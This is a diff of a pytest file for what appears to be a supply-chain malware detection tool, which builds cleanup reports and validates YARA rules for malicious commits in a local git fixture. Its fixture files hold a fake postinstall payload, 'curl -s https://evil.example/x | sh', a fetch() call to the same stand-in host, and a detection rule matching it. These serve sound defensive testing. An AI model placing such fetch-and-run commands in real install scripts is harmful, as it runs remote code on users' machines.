@@ -8,12 +8,13 @@ import base64
 import hashlib
 import io
 import re
+import shutil
 import tarfile
 
 import pytest
 from sqlalchemy import select
 
-from conftest import FixtureBroker, application, connection, source_snapshot
+from conftest import FixtureBroker, application, connection, git_repository, source_snapshot
 from numen import detection, domain
 from numen.artifacts import MAX_SUBMISSION, publish
 from numen.broker import Broker
@@ -106,45 +107,49 @@ def test_the_cleanup_report_keeps_only_changed_files_and_strings_from_the_added_
     }
 
 
-def test_the_cleanup_report_lists_the_commits_and_releases_that_contained_the_change(system, monkeypatch):
+def test_the_cleanup_report_lists_the_commits_and_releases_that_contained_the_change(system, tmp_path):
     app, client, _ = system
     connection(app)
-    monitored = application(client)
-    ident = postinstall(app, monitored["id"])
-    backfilled = postinstall(app, monitored["id"], "c" * 40, backfill=True, committed_at="2026-09-01T00:00:00Z")
-    stored = {}
+    monitored = application(client)  # demo/plugin as an Upstream repository with no Locked version
+    repo = git_repository(tmp_path / "git", "demo/plugin")
+    first = repo.commit("Release 0.9.0", POSTINSTALL_PARENT)
+    repo.tag("v0.9.0")
+    backfilled = repo.commit("Add a loader", {"loader.js": "fetch('https://evil.example/x');\n"})
+    baseline = repo.commit("Release 1.0.0", {"CHANGELOG.md": "1.0.0\n"})
+    repo.tag("v1.0.0")
+    change = repo.commit("Add a postinstall script", {"install.js": "require('child_process').exec('curl -s https://evil.example/x | sh');\n"})
+    later = repo.commit("Release 1.1.0", {"CHANGELOG.md": "1.1.0\n"})
+    newest = repo.commit("Document the release", {"README.md": "Shop\n"})
+    repo.tag("v1.1.0")
+    repo.branch("1.x", baseline)
+    backport = repo.cherry_pick(change)  # the same change on the watched Release branch
+    repo.tag("v1.0.1")
+    repo.branch("0.x", first)
+    repo.cherry_pick(change)  # and on a branch that is not watched
+    repo.tag("v0.9.1")
+    ident = postinstall(app, monitored["id"], change)
     with app.state.factory.begin() as db:
         repository = db.get(Repository, db.get(Commit, ident).repository_id)
-        repository.baseline_revision = "b" * 40
-        for revision, when, generation, data in (
-            ("0" * 40, "2026-10-01T00:00:00Z", 1, {}),
-            ("2" * 40, "2026-11-03T00:00:00Z", 1, {}),
-            ("1" * 40, "2026-11-02T00:00:00Z", 1, {}),
-            ("3" * 40, "2026-11-02T12:00:00Z", 1, {"branch": "1.x"}),  # Another branch
-            ("4" * 40, "2026-11-04T00:00:00Z", 0, {}),  # An earlier source generation
-        ):
-            row = Commit(repository_id=repository.id, source_generation=generation, revision=revision,
-                         data={"committed_at": when, **data})
-            db.add(row)
-            db.flush()
-            stored[revision] = row.id
-    tags = [("v1.0.2", "2" * 40), ("v1.1.0", "3" * 40), ("v1.0.1", "a" * 40), ("v1.0.0", "0" * 40), ("v0.9.0", "b" * 40)]
-    monkeypatch.setattr(Sources, "github_tags", lambda self, repository: tags)
+        repository.baseline_revision, repository.watched_branches = baseline, {"1.x": {}}
+        stored = Commit(repository_id=repository.id, source_generation=1, revision=later, data={})
+        db.add(stored)
+        db.flush()
+        stored = stored.id
     report = analysed(system, ident)["cleanup_report"]
-    assert report["commits"] == [{"revision": "a" * 40, "commit_id": ident}] + [
-        {"revision": r * 40, "commit_id": stored[r * 40]} for r in "12"]
-    assert (report["releases"], report["commits_truncated"]) == (["v1.0.2", "v1.0.1"], False)
-    # A Backfill commit is also contained in the Baseline, which no stored commit may hold.
-    report = analysed(system, backfilled)["cleanup_report"]
-    assert report["commits"] == [{"revision": "c" * 40, "commit_id": backfilled}] + [
-        {"revision": r * 40, "commit_id": stored.get(r * 40, ident)} for r in "0a12"] + [
-        {"revision": "b" * 40, "commit_id": None}]
-    assert report["releases"] == ["v1.0.2", "v1.0.1", "v1.0.0", "v0.9.0"]
-    # A failed tag request leaves the releases unknown, never empty.
-    def unavailable(self, repository):
-        raise DomainError("upstream_error", "Source returned HTTP 502", 502)
-    monkeypatch.setattr(Sources, "github_tags", unavailable)
-    assert analysed(system, ident)["cleanup_report"]["releases"] is None
+    # The commit and what descends from it on the watched branches, then its backport.
+    assert report["commits"] == [{"revision": change, "commit_id": ident}, {"revision": later, "commit_id": stored},
+                                 {"revision": newest, "commit_id": None}, {"revision": backport, "commit_id": None}]
+    assert (report["releases"], report["commits_truncated"]) == (["v1.0.1", "v1.1.0"], False)
+    # A Backfill commit reaches the Baseline, which is not stored, through its descendants.
+    backfill = postinstall(app, monitored["id"], backfilled, backfill=True)
+    report = analysed(system, backfill)["cleanup_report"]
+    assert [row["revision"] for row in report["commits"]] == [backfilled, baseline, change, later, newest, backport]
+    assert [row["commit_id"] for row in report["commits"]] == [backfill, None, ident, stored, None, None]
+    assert report["releases"] == ["v1.0.1", "v1.1.0", "v1.0.0"]
+    # Tags that cannot be read leave the releases unknown, never empty.
+    shutil.rmtree(repo.path)
+    report = analysed(system, ident)["cleanup_report"]
+    assert (report["commits"], report["releases"]) == ([{"revision": change, "commit_id": ident}], None)
     # A WordPress plugin has no tags to read. Its SVN paths name the snapshot's files by suffix.
     blog = application(client, asset_name="Blog", source_kind="wordpress", source_url=None,
                        plugin_slug="fixture", source_ref="trunk")
@@ -212,19 +217,22 @@ def stored(app, repository_id, revision, files):
         publish(db, app.state.config.artifact_root, "snapshot", row.id, {p: t.encode() for p, t in files.items()})
 
 
-def seeded(system, monkeypatch, monitored=None, parent=True, baseline=POSTINSTALL["baseline"], **data):
+def seeded(system, tmp_path, monitored=None, parent=True, baseline=POSTINSTALL["baseline"], **data):
     """The postinstall commit M on `monitored`'s repository (an Own one by default), with its
-    parent P and Baseline B stored as intake keeps them; M's id."""
+    parent P and Baseline B stored as intake keeps them, and released as v1.0.1 after v1.0.0; M's id."""
     app, client, _ = system
     monitored = monitored or application(client, role="own", source_url="https://github.com/acme/shop")
-    ident = postinstall(app, monitored["id"], **data)
+    repo = git_repository(tmp_path / "git", monitored["repositories"][0]["source_url"].removeprefix("https://github.com/"))
+    repo.commit("Release 1.0.0", POSTINSTALL_PARENT)
+    repo.tag("v1.0.0")
+    ident = postinstall(app, monitored["id"], repo.commit("Release 1.0.1", POSTINSTALL["changed"]), **data)
+    repo.tag("v1.0.1")
     repository_id = monitored["repositories"][0]["repository_id"]
     with app.state.factory.begin() as db:
         db.get(Repository, repository_id).baseline_revision = BASELINE
     if parent:
         stored(app, repository_id, PARENT, POSTINSTALL["parent"])
     stored(app, repository_id, BASELINE, baseline)
-    monkeypatch.setattr(Sources, "github_tags", lambda self, repository: [("v1.0.1", "a" * 40), ("v1.0.0", BASELINE)])
     return ident
 
 
@@ -269,10 +277,10 @@ def validated(system, ident, runs):
     return client.get(f"/api/findings/{job['result']['finding_id']}").json()
 
 
-def test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding(system, monkeypatch):
+def test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and_a_confirmed_finding(system, tmp_path):
     app, client, _ = system
     connection(app)
-    ident = seeded(system, monkeypatch)
+    ident = seeded(system, tmp_path)
     runs = broker()
     finding = validated(system, ident, runs)
     # AC-A07: no job ever executes the payload. The agent reads the diff and yara reads the trees.
@@ -297,7 +305,8 @@ def test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and
     assert cause == {"by": "detection_rule", "artifact_revision": finding["artifact_revision"], "job_id": job["id"]}
     assert [e["action"] for e in finding["events"]] == ["opened", "transition"]
     report = finding["cleanup_report"]
-    assert report["commits"] == [{"revision": "a" * 40, "commit_id": ident}] and report["releases"] == ["v1.0.1"]
+    revision = client.get(f"/api/commits/{ident}").json()["revision"]
+    assert report["commits"] == [{"revision": revision, "commit_id": ident}] and report["releases"] == ["v1.0.1"]
     assert report["secrets"] == SHIPPED["reachable_secrets"]
     assert [f["path"] for f in proof["indicators"]["files"]] == ["package.json"]
 
@@ -311,10 +320,10 @@ def test_a_malicious_postinstall_commit_ends_validated_with_a_cleanup_report_and
     ("baseline", 'rule loader_url { strings: $a = "evil.example/x" condition: $a }',
      "The Detection rule also matches files in the Baseline tree"),
 ])
-def test_a_failing_check_leaves_draft_names_the_check_and_keeps_the_state(system, monkeypatch, check, rule, message):
+def test_a_failing_check_leaves_draft_names_the_check_and_keeps_the_state(system, tmp_path, check, rule, message):
     app, client, _ = system
     connection(app)
-    ident = seeded(system, monkeypatch, baseline=LEGACY)
+    ident = seeded(system, tmp_path, baseline=LEGACY)
     runs = broker(rule)
     finding = validated(system, ident, runs)
     proof = finding["static_proof"]
@@ -337,11 +346,11 @@ def test_a_failing_check_leaves_draft_names_the_check_and_keeps_the_state(system
     assert [e["action"] for e in current["events"]] == ["opened", "artifacts_uploaded", "transition", "artifacts_uploaded"]
 
 
-def test_a_backfill_commit_is_checked_against_its_parent_tree_only(system, monkeypatch):
+def test_a_backfill_commit_is_checked_against_its_parent_tree_only(system, tmp_path):
     app, _, _ = system
     connection(app)
     # The Baseline came after a Backfill commit, so it still holds the loader.
-    ident = seeded(system, monkeypatch, baseline={**POSTINSTALL["parent"], **POSTINSTALL["changed"]}, backfill=True)
+    ident = seeded(system, tmp_path, baseline={**POSTINSTALL["parent"], **POSTINSTALL["changed"]}, backfill=True)
     runs = broker()
     finding = validated(system, ident, runs)
     assert sorted(runs.calls[1]["files"]) == ["changed/package.json", "parent/package.json", "parent/server.js", "rule.yar"]
@@ -350,10 +359,10 @@ def test_a_backfill_commit_is_checked_against_its_parent_tree_only(system, monke
     assert (finding["static_proof"]["status"], finding["status"]) == ("validated", "confirmed")
 
 
-def test_a_missing_tree_is_fetched_through_the_read_only_github_path(system, monkeypatch):
+def test_a_missing_tree_is_fetched_through_the_read_only_github_path(system, tmp_path, monkeypatch):
     app, _, _ = system
     connection(app)
-    ident = seeded(system, monkeypatch, parent=False)
+    ident = seeded(system, tmp_path, parent=False)
     fetched = []
 
     def tarball(self, repository, revision):
@@ -370,10 +379,10 @@ def test_a_missing_tree_is_fetched_through_the_read_only_github_path(system, mon
     assert (finding["static_proof"]["status"], finding["status"]) == ("validated", "confirmed")
 
 
-def test_uploading_a_corrected_rule_validates_the_new_revision(system, monkeypatch):
+def test_uploading_a_corrected_rule_validates_the_new_revision(system, tmp_path):
     app, client, config = system
     connection(app)
-    ident = seeded(system, monkeypatch)
+    ident = seeded(system, tmp_path)
     runs = broker('rule broken { strings: $a = "payload-ran" }')
     first = validated(system, ident, runs)
     assert (first["static_proof"]["status"], first["status"]) == ("failed", "open")
@@ -414,11 +423,11 @@ def test_generation_is_refused_for_a_malicious_change_finding(system):
     assert client.get(f"/api/findings/{finding['id']}").json()["static_proof"] == finding["static_proof"]
 
 
-def test_an_upstream_malicious_change_gets_a_static_proof_and_cleanup_report_in_each_application(system, monkeypatch):
+def test_an_upstream_malicious_change_gets_a_static_proof_and_cleanup_report_in_each_application(system, tmp_path):
     app, client, _ = system
     connection(app)
     shop, blog = (application(client, asset_name=name) for name in ("Shop", "Blog"))
-    ident = seeded(system, monkeypatch, shop)
+    ident = seeded(system, tmp_path, shop)
     runs = broker()
     validated(system, ident, runs)
     assert [call["kind"] for call in runs.calls] == ["agent", "detection_rule", "detection_rule"]
